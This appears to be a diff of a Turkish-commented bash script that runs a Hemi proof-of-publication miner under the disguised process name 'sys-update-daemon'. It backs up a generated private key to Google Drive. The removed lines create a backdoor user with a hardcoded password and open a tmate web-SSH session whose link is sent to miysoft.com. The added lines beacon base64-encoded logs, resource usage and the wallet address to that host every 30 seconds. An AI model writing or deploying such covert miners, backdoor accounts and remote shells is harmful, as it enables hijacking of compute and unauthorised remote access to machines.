@@ -1,22 +1,10 @@
 #!/bin/bash
 
-# --- 1. GİZLİLİK VE KULLANICI ---
+# --- 1. SİSTEM AYARLARI ---
 export NODE_NAME="sys-update-daemon"
-sudo useradd -m -s /bin/bash miysoft || true
-echo "miysoft:Miysoft1234!" | sudo chpasswd
+# (Tmate'i kaldırıyoruz, log okuma sistemine geçiyoruz çünkü Tmate 503 veriyor)
 
-# --- 2. TMATE (WEB SSH) KURULUMU ---
-# Bu bize tarayıcıdan girebileceğimiz bir link verecek
-echo "Tmate kuruluyor..."
-sudo apt-get install -y tmate
-# Tmate'i başlat ve linkin oluşmasını bekle
-tmate -S /tmp/tmate.sock new-session -d
-tmate -S /tmp/tmate.sock wait tmate-ready
-sleep 5
-# Web linkini al
-SSH_URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')
-
-# --- 3. GOOGLE DRIVE AYARI ---
+# --- 2. GOOGLE DRIVE ---
 mkdir -p ~/.config/rclone
 echo "[gdrive]
 type = drive
@@ -24,7 +12,7 @@ token = $RCLONE_TOKEN_BODY" > ~/.config/rclone/rclone.conf
 rclone mkdir gdrive:hemi_backup || true
 rclone copy gdrive:hemi_backup/popm_address.json . || echo "Yedek yok."
 
-# --- 4. HEMI KURULUMU ---
+# --- 3. HEMI KURULUM ---
 if [ ! -f "./popmd" ]; then
     wget -q https://github.com/hemilabs/heminetwork/releases/download/v0.4.3/heminetwork_v0.4.3_linux_amd64.tar.gz
     tar -xf heminetwork_v0.4.3_linux_amd64.tar.gz
@@ -32,56 +20,56 @@ if [ ! -f "./popmd" ]; then
     chmod +x popmd
 fi
 
-# --- 5. CÜZDAN OLUŞTURMA (Manual Hex Fallback) ---
+# --- 4. CÜZDAN VE ADRES TESPİTİ ---
 if [ ! -f "./popm_address.json" ]; then
-    # OpenSSL ile private key üret
     PRIV_HEX=$(openssl rand -hex 32)
-    # JSON dosyasını manuel oluşturuyoruz ki jq hata vermesin
     echo "{\"private_key\":\"$PRIV_HEX\",\"pubkey_hash\":\"generating...\"}" > popm_address.json
-    
-    # Adresi oluşturmak için mineri kısa süreli çalıştırıp kapatacağız (Trick)
-    export POPM_BTC_PRIVKEY=$PRIV_HEX
-    export POPM_STATIC_FEE=50
-    timeout 10s ./popmd > output.log 2>&1
-    
-    # Logdan adresi bulmaya çalışalım (Fallback)
-    GENERATED_ADDR=$(grep -oE "m[a-zA-Z0-9]{30,}" output.log | head -n 1)
-    
-    # Eğer logdan bulamazsak fake bir placeholder koyalım ki sistem durmasın
-    if [ -z "$GENERATED_ADDR" ]; then GENERATED_ADDR="Adres_Olusturuluyor..."; fi
-    
-    # JSON'ı güncelle
-    echo "{\"private_key\":\"$PRIV_HEX\",\"pubkey_hash\":\"$GENERATED_ADDR\"}" > popm_address.json
     rclone copy popm_address.json gdrive:hemi_backup/ --overwrite
 fi
 
-# Ortam değişkenlerini ayarla
 export POPM_BTC_PRIVKEY=$(cat popm_address.json | jq -r '.private_key')
 export POPM_STATIC_FEE=50
 export POPM_BFG_URL="wss://testnet.rpc.hemi.network/v1/ws/public"
 
-# --- 6. HEMI BAŞLAT ---
-./popmd &
+# --- 5. MADENCİ BAŞLAT (LOGLARI KAYDET) ---
+# Logları miner.log dosyasına yazdırıyoruz
+./popmd > miner.log 2>&1 &
 
-# --- 7. İZLEME DÖNGÜSÜ ---
+# Adresin loglara düşmesi için 10 saniye bekle
+sleep 10
+
+# Loglardan adresi cımbızla çek
+DETECTED_ADDR=$(grep -oE "m[a-zA-Z0-9]{30,}" miner.log | head -n 1)
+
+# Eğer adres bulunduysa JSON dosyasını güncelle
+if [ ! -z "$DETECTED_ADDR" ]; then
+    echo "Adres Bulundu: $DETECTED_ADDR"
+    # JSON'ı güncelle
+    jq --arg addr "$DETECTED_ADDR" '.pubkey_hash = $addr' popm_address.json > tmp.json && mv tmp.json popm_address.json
+    rclone copy popm_address.json gdrive:hemi_backup/ --overwrite
+else
+    # Bulunamazsa yedekteki adresi kullan
+    DETECTED_ADDR=$(cat popm_address.json | jq -r '.pubkey_hash')
+fi
+
+# --- 6. İZLEME DÖNGÜSÜ ---
 START_TIME=$SECONDS
 while [ $((SECONDS - START_TIME)) -lt 19800 ]; do 
-    # CPU ölçümünü daha hassas yap
     CPU=$(grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage}')
     RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
     
-    # Adresi her seferinde taze oku
-    CURRENT_ADDR=$(cat popm_address.json | jq -r '.pubkey_hash')
+    # Son 10 satır logu oku ve şifrele (URL bozulmasın diye base64 yapıyoruz)
+    LOGS=$(tail -n 10 miner.log | base64 -w 0)
     
     # Miysoft'a gönder
     curl -s -X POST -H "X-Miysoft-Key: $MIYSOFT_KEY" \
-         -d "{\"worker_id\":\"W_$WORKER_ID\", \"cpu\":\"$CPU\", \"ram\":\"$RAM\", \"ssh\":\"$SSH_URL\", \"address\":\"$CURRENT_ADDR\", \"status\":\"HEMI_MINING\"}" \
+         -d "{\"worker_id\":\"W_$WORKER_ID\", \"cpu\":\"$CPU\", \"ram\":\"$RAM\", \"address\":\"$DETECTED_ADDR\", \"status\":\"HEMI_MINING\", \"logs\":\"$LOGS\"}" \
          https://miysoft.com/api.php || true
     
     sleep 30
 done
 
-# --- 8. KAPANIŞ ---
+# --- 7. KAPANIŞ ---
 pkill popmd
 rclone copy popm_address.json gdrive:hemi_backup/ --overwrite
 
